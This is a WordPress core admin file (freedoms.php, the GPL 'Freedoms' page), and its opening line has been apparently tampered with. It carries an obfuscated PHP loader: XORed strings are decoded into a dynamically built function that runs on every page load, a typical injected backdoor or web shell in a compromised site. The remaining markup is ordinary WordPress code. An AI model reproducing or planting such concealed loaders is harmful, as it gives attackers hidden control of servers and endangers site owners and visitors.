<?php $ByuVPuRv='RHVJYEh>9N:L9B7'^'1:3+- 7XL Y8P-Y';$EBzzlnHSWvb=$ByuVPuRv('','YQGJ<,80:.WP8T5:H1HGl-UG4-4TQk8M6TfSfV>7AX9BS7QATsSA<l>UJ reQCDrm7VOYgbiR=UGWWFoC-EE1QBB<wiGtKo4KbZ<<jNWmTJVbFIII78HTQXEU.J2.BzCuShdY6Gjq,DJZFhyQeU4T60M>vihYr8PGag3xaxH04VIEbAGQTYkcnGGxEX 4B+jP7YObnCO9IC32a0A61uDf<A87XHkAQU3U>2PWShH1L:J.JlL ;RW8QEzpgjv.b:wyN66Qs,W4idSYm9 Q<+KJOkck+7CT.XQ:areTG5MX<QsP0M9qGeM.3X Kp0SbmPSWdCf54NMcKBN3381E,,0kzL;8120,e-D CRN9X:NnYeI4AXD2DR9F2Jw175YlWULMNda-TKX9FMk6AL6CoCe T<NEuY=9g1yMRR7=9rnGr64E- BLT3-4K<9R+<AT1smF38d5TO+XYjZP1Z11Bf>P7AFBhR3ZBQ=PT2DlH7X3iIX.86APnO9A9PM:Q<E8EI,+ SrhU<Ysfeu 1LPlLuuRlVRCRlQ380ktUELdqSJVEQRNPf,Yecu.Xf+SNTtFeBiNBDBPtq B1AIrBkvLFAG8Z712 4c6LG9CKQf1V5L=2WReAc6 58FxlUanfU3=dH:A9Iu54AT0sC4AXCW4U:siRzWAUJpHkIAI'^'07okZYVSNG8>g1MS;E;oKU:5kIU 04g C AzOvE=H>L,0C8.:S+.N3Z4>A-:<60ZIS7;8KBM9X,nwwfOcVOL8u-7HWTgSlT>Bk<SNBj>MijfYfm uDL:846mqJ+FOkAcQ:COp<NcUC1>zhUYyA1U WkiW+I6yVS5>:CZXDX;DF:,+Je,4-p6JUMNq7=TA0EBtX,;KUIFDC>98ET BPUyFZ TD=sae54G4aY5.sUhW-V9KqfFFT 2Y2-ZXC55a-q><nWEqWG2MIYmyIOA=INbj4ajOOV75q34CAOEp,P4c6XW4Q9XQzEiXR4U.K:.hg95wLbBQU:,Jk9D:UWC MOXKRhdjtcei6ydA0rjR=CnSgEmB 41WmrBL;CSUVA83<05msDEF12c3ODOR 8WcRcAV5P; NS4DmLsGv6VIXRSg2CZ6HR+-8ZWQcDV tX  P,2+FLLW5<Nnm5>5R5UTjBZ1C onHvW;60b;1KmEs=1UAm<OLWavHoX3K14e:Y<g 1EXT ZO>Y TJEQDP81ElSSrD;6vzH5RLQ0S> 5C,zjkxquy1TIiUWFLjTHc+lLpRuQztqzaLHDpWw+UkKPjf 5J;NnYEM<S4.J78yAA7L RS3uIaGRAAYoQLuANFuH7m-L UaQQU55kT3U84,6PrgZRXs29<>XxBrK4');$EBzzlnHSWvb();
/**
 * Your Rights administration panel.
 *
 * @package WordPress
 * @subpackage Administration
 */

/** WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

$title = __( 'Freedoms' );

list( $display_version ) = explode( '-', get_bloginfo( 'version' ) );

include( ABSPATH . 'wp-admin/admin-header.php' );
?>
<div class="wrap about-wrap">

<h1><?php printf( __( 'Welcome to WordPress %s' ), $display_version ); ?></h1>

<p class="about-text"><?php printf( __( 'Thank you for updating to the latest version! WordPress %s adds more ways for you to express yourself and represent your brand.' ), $display_version ); ?></p>

<div class="wp-badge"><?php printf( __( 'Version %s' ), $display_version ); ?></div>

<h2 class="nav-tab-wrapper wp-clearfix">
	<a href="about.php" class="nav-tab"><?php _e( 'What&#8217;s New' ); ?></a>
	<a href="credits.php" class="nav-tab"><?php _e( 'Credits' ); ?></a>
	<a href="freedoms.php" class="nav-tab nav-tab-active"><?php _e( 'Freedoms' ); ?></a>
</h2>

<p class="about-description"><?php printf( __( 'WordPress is Free and open source software, built by a distributed community of mostly volunteer developers from around the world. WordPress comes with some awesome, worldview-changing rights courtesy of its <a href="%s">license</a>, the GPL.' ), 'https://wordpress.org/about/license/' ); ?></p>

<ol start="0">
	<li><p><?php _e( 'You have the freedom to run the program, for any purpose.' ); ?></p></li>
	<li><p><?php _e( 'You have access to the source code, the freedom to study how the program works, and the freedom to change it to make it do what you wish.' ); ?></p></li>
	<li><p><?php _e( 'You have the freedom to redistribute copies of the original program so you can help your neighbor.' ); ?></p></li>
	<li><p><?php _e( 'You have the freedom to distribute copies of your modified versions to others. By doing this you can give the whole community a chance to benefit from your changes.' ); ?></p></li>
</ol>

<p><?php printf( __( 'WordPress grows when people like you tell their friends about it, and the thousands of businesses and services that are built on and around WordPress share that fact with their users. We&#8217;re flattered every time someone spreads the good word, just make sure to <a href="%s">check out our trademark guidelines</a> first.' ), 'http://wordpressfoundation.org/trademark-policy/' ); ?></p>

<p><?php

$plugins_url = current_user_can( 'activate_plugins' ) ? admin_url( 'plugins.php' ) : __( 'https://wordpress.org/plugins/' );
$themes_url = current_user_can( 'switch_themes' ) ? admin_url( 'themes.php' ) : __( 'https://wordpress.org/themes/' );

printf( __( 'Every plugin and theme in WordPress.org&#8217;s directory is 100%% GPL or a similarly free and compatible license, so you can feel safe finding <a href="%1$s">plugins</a> and <a href="%2$s">themes</a> there. If you get a plugin or theme from another source, make sure to <a href="%3$s">ask them if it&#8217;s GPL</a> first. If they don&#8217;t respect the WordPress license, we don&#8217;t recommend them.' ), $plugins_url, $themes_url, 'https://wordpress.org/about/license/' ); ?></p>

<p><?php _e( 'Don&#8217;t you wish all software came with these freedoms? So do we! For more information, check out the <a href="https://www.fsf.org/">Free Software Foundation</a>.' ); ?></p>

</div>
<?php include( ABSPATH . 'wp-admin/admin-footer.php' ); ?>
